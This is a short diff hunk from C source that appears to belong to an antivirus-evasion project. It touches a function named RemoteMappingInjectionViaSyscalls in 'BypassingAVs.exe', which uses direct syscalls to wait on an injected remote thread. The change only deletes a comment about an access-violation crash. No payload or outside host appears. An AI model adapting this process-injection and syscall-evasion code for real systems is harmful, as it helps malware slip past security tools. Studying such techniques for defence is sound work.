@@ -208,8 +208,6 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	}
 
 	// Waiting for the thread to finish
-	/// !ERROR: somehow, I got this exception: 
-	/// "Unhandled exception at 0x00007FFD5DD16E99 (bcryptprimitives.dll) in BypassingAVs.exe: 0xC0000005: Access violation reading location 0xFFFFFFFFFFFFFFFF."
 	WhisperHell(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
 	if ((status = NtWaitForSingleObject(
 		hThread,
